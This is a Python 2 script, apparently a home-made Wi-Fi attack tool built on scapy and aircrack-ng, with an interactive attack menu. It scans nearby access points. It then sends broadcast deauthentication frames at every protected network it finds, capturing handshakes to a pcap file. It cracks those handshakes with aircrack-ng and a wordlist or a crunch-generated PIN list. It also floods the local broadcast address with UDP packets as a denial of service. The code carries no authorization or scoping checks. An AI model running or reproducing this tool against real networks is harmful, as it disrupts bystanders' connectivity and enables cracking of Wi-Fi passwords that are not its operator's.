W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
P  = '\033[35m' # purple
BOLD = '\033[1m' # bold
THIN = '\033[1m' # normal
PRE = G+'[ '+R+'+'+G+' ] '+G
try:
  import sys
  import os
  import time
  from threading import Thread
  from scapy.all import *
  from scapy.utils import PcapWriter
  import signal
  conf.verb = 0
except:
  print PRE+"Unable to import modules, please make sure you installed them all"
  print PRE+"sys , os , time , threading , scapy , signal"
  print PRE+"Exiting ..."
  exit(1)
class Wireless_Test:
  def __init__(self,interface):
    print ""+G+BOLD
    print PRE+"Starting Program ..."
    signal.signal(signal.SIGINT,self.signal_handler)
    if interface != "wlan0":
      print PRE+"Interface must be WLAN0\n[ ! ] Exiting ..."
      exit(1)
    try:
      print PRE+"Starting monitor mode on %s ..."%interface
      time.sleep(2)
      os.system("airmon-ng start "+interface)
      os.system("clear")
      print PRE+"Monitor mode started, name is : wlan0mon "
    except:
      print PRE+"Error, try to install 'aircrack-ng'\n[ ! ] exiting ..."
      exit(1)
    self.interface = interface+"mon"
    self.hosts = []
    self.switch = "SCAN"
    self.changing_channel = False
    conf.iface = self.interface
    self.sniffing = False
    self.capture_packet = False
    self.enabled_dos = False
  def Scan(self):
    print PRE+"Starting scan ..."
    self.changing_channel = True
    self.sniffing = True
    tr = threading.Thread(target=self.change_channel,args=())
    tr.start()
    try:
      while self.sniffing:
        sniff(iface=self.interface,prn=self.pkt_handler,store=0,count=1)
      self.changing_channel = False
      self.sniffing = False
      print PRE+"Scan stoped ..."
      self.signal_handler()
    except:
      print PRE+"Scan stoped ..."
      self.signal_handler()  
  def change_channel(self):
    counter = 1
    while counter <= 11 and self.changing_channel:
      time.sleep(2)
      os.system("iwconfig  %s  channel  %d  "%(self.interface,counter))
      counter += 1
      if counter >= 11 and self.changing_channel:
        counter = 1
  def pkt_handler(self,pkt):
    if pkt.type == 0 and pkt.subtype == 8:
      if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeReq):
        record = []
        SSID = pkt[Dot11Elt].info
        record.append(SSID)
        BSSID = pkt[Dot11].addr3
        record.append(BSSID)
        CHANNEL = int(ord(pkt[Dot11Elt:3].info))
        record.append(CHANNEL)
        c = pkt.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}{Dot11ProbeResp:Dot11ProbeResp.cap%}")
        if "privacy" in str(c).split("+"):
          record.append("WEP/WPA/WPA2")
        else:
          record.append("OPEN")
        if record not in self.hosts:
          print 'ESSID :'+R,record[0],G+'\tBSSID :'+R,record[1],G+'\tCH :'+R,record[2],G+'\tPROTECTION :'+R,record[3]+G
          self.hosts.append(record)
  def signal_handler(self):
    self.changing_channel = False
    self.sniffing = False
    x = raw_input("\n"+PRE+"Do you want to exit?[y/n]")
    if x == 'y' or x == 'Y' or x == "yes" or x == 'Yes' or x == 'YES':
      print PRE+"Stoping monitor mode ..."
      os.system("airmon-ng stop "+self.interface)
      os.system("clear")
      print PRE+"Monitor mode stoped.\n"+PRE+"Bye :-)"
      exit(0)
    else:
      if self.switch == "SCAN":
        while True:
          ty = raw_input(PRE+"Which type of attack do you want to apply? just Write number of them.\n\t1 - Dos\n\t2 - Deauthenticate\nType of attack: ")
          if ty != "1" and ty != "2":
            print PRE+"Wrong input"
          elif ty == "1":
            self.switch = "DOS"
            self.dos()
            break
          elif ty == "2":
            self.switch = "DEAUTH"
            self.deauthenticate()
            break
      elif self.switch == "DEAUTH":
        while True:
          ty = raw_input(PRE+"Do you want to crack these access points? [y/n] ")
          if ty != "y" and ty != "n":
            print PRE+"Wrong input, just type 'y' or 'n'"
          elif ty == "y":
            self.switch = "CRACK"
            self.crack()
            break
          elif ty == "n":
            self.switch = "SCAN"
            c = raw_input(PRE+"Do you want to clear the captured packets? [y/n] ")
            if c == 'y' or c == 'Y' or c == 'Yes' or c == 'yes' or c == 'YES':
              os.system("rm ./handshakes.pcap")
            self.signal_handler()
            break
  def deauthenticate(self):
    if len(self.hosts) == 0:
      print PRE+"NO hosts detected, please first scan for hosts"
      print PRE+"Exiting ..."
      exit(0)
    c = 0
    for i in self.hosts:
      if i[3] != "OPEN":
        c += 1
    if c == 0:
      print PRE+"NO protected host detected, please first scan some hosts"
      return self.signal_handler()
    print PRE+"Starting DEAUTH attack ..."
    self.capture_packet = True
    t = threading.Thread(target=self.capture_packets,args=())
    try:
      t.start()
      while True:
        for record in self.hosts:
          if record[3] != "OPEN":
            os.system("iwconfig  %s  channel  %d  "%(self.interface,record[2]))
            ap_c_pckt = RadioTap()/Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=record[1], addr3=record[1]) / Dot11Deauth()
            for i in range(4):
              sendp(ap_c_pckt)
            time.sleep(8)
      print PRE+"Deauth attack stoped"
      print PRE+"All packets saved at 'handshakes.pcap'"
      self.capture_packet = False
      self.signal_handler()
    except:
      self.capture_packet = False
      os.system("clear")
      print PRE+"Deauth attack stoped"
      print PRE+"All packets saved at 'handshakes.pcap'"
      self.signal_handler()
  def crack(self):
    os.system("clear")
    print PRE+"Start cracking password ..."
    x = raw_input(PRE+"Do you want to use your own Wordlist file ?[y/n] ")
    p = None
    if x == 'y' or x == 'Y' or x == 'yes' or x == 'Yes' or x == 'YES':
      while True:
        path = raw_input(PRE+"Write full path to your Wordlist: ")
        if not os.path.exists(path):
          print PRE+"No such file or directory"
        else:
          p = path
          break
    if p != None:
      try:
        os.system("sudo aircrack-ng ./handshakes.pcap -w "+p)
      except:
        pass
    else:
      os.popen("crunch 4 4 1234567890 > Wordlist.txt")
      os.system("sudo aircrack-ng ./handshakes.pcap -w Wordlist.txt")
  def capture_packets(self):
    try:
      while self.capture_packet:
        sniff(iface=self.interface,prn=self.save_pkt,store=0,count=1)
    except:
      pass 
  def save_pkt(self,pkt):
    wrpcap("./handshakes.pcap",pkt,append=True)
  def dos(self):
    print PRE+"Stoping monitor mode ..."
    os.system("airmon-ng stop "+self.interface)
    os.system("clear")
    print PRE+"Monitor mode stoped ..."
    print PRE+"Please connect to the open network ..."
    print PRE+"Waiting for 2 minutes ..."
    time.sleep(120)
    print PRE+"Finding IP ..."
    d = self.get_ip()
    if len(d) == 0:
      os.system("airmon-ng start wlan0")
      os.system("clear")
      print PRE+'Could not find any valid IP address, reverting ...'
      print PRE+"Monitor mode started again"
      return
    self.enabled_dos = True
    t = threading.Thread(target=self.do_dos,args=(str(d[0]).split(".")[0]+"."+str(d[0]).split(".")[1]+"."+str(d[0]).split(".")[2]+"."+"255"))
    t.start()
    time.sleep(120)
    self.enabled_dos = False
  def get_ip(self):
    file=os.popen("ifconfig")
    data=file.read()
    file.close()
    bits=data.strip().split('\n')
    addresses=[]
    for bit in bits:
      if bit.strip().startswith("inet "):
        other_bits=bit.replace(':', ' ').strip().split(' ')
        for obit in other_bits:
          if (obit.count('.')==3):
            if not obit.startswith("127."):
              addresses.append(obit)
            break
    return addresses
  def do_dos(self,ip):
    s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET,socket.SO_BROADCAST,1)
    payload = "\x10\x10\x10\x10"*150
    print PRE+"Starting DoS ..."
    try:
      while self.enabled_dos:
        s.sendto(payload,(ip,80))
      print PRE+"Stoping DoS ..."
    except:
      print PRE+"Target is down ..."
def main():
  os.system("clear")
  print BOLD+PRE+"Welcome"
  obj = Wireless_Test("wlan0")
  obj.Scan()
if __name__ == "__main__":
  main()
